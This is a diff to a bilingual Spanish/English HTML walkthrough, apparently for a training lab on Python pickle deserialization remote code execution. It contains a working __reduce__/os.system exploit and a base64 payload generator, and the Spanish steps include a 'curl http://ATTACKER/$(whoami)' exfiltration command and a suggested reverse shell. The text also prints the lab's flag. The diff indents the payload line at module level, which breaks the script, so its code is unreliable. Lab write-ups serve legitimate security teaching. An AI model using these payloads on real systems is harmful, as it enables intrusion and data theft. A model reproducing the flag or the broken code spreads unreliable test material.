@@ -55,15 +55,16 @@
       <li>Python's <code>pickle.loads()</code> ejecuta código Python arbitrario al deserializar objetos.</li>
       <li>Crea un payload malicioso que ejecute un comando del sistema:</li>
     </ol>
-    <pre>import pickle, base64, os
+    <pre>import pickle as pkl, base64, os
 
 class Exploit(object):
     def __reduce__(self):
         return (os.system, ('id',))
 
-payload = base64.b64encode(pickle.dumps(Exploit())).decode()
+  payload = base64.b64encode(pkl.dumps(Exploit())).decode()
 print(payload)</pre>
     <ol start="3">
+      <li>No llames tu script <code>pickle.py</code> (sombrea el modulo estandar). Usa por ejemplo <code>exploit_pickle.py</code> y ejecuta: <code>python3 exploit_pickle.py</code>.</li>
       <li>Envía el payload al formulario. El servidor ejecutará <code>os.system('id')</code>.</li>
       <li>Cambia <code>'id'</code> por cualquier comando: <code>'curl http://ATTACKER/$(whoami)'</code>, reverse shell, etc.</li>
       <li>Cuando el payload alcanza primitivas de ejecución, el lab muestra la flag dedicada: <code>HL{d353r1411z4710n_rc3_5ucc355}</code>.</li>
@@ -78,15 +79,16 @@ print(payload)</pre>
       <li>Python's <code>pickle.loads()</code> executes arbitrary Python code when deserializing objects.</li>
       <li>Create a malicious payload that runs a system command:</li>
     </ol>
-    <pre>import pickle, base64, os
+    <pre>import pickle as pkl, base64, os
 
 class Exploit(object):
     def __reduce__(self):
         return (os.system, ('id',))
 
-payload = base64.b64encode(pickle.dumps(Exploit())).decode()
+  payload = base64.b64encode(pkl.dumps(Exploit())).decode()
 print(payload)</pre>
     <ol start="3">
+      <li>Do not name your script <code>pickle.py</code> (it shadows the stdlib module). Use <code>exploit_pickle.py</code> and run: <code>python3 exploit_pickle.py</code>.</li>
       <li>Submit the payload via the form. The server will execute <code>os.system('id')</code>.</li>
       <li>Replace <code>'id'</code> with any command: reverse shell, file read, etc.</li>
       <li>When code execution primitives are reached, the lab displays the dedicated flag: <code>HL{d353r1411z4710n_rc3_5ucc355}</code>.</li>
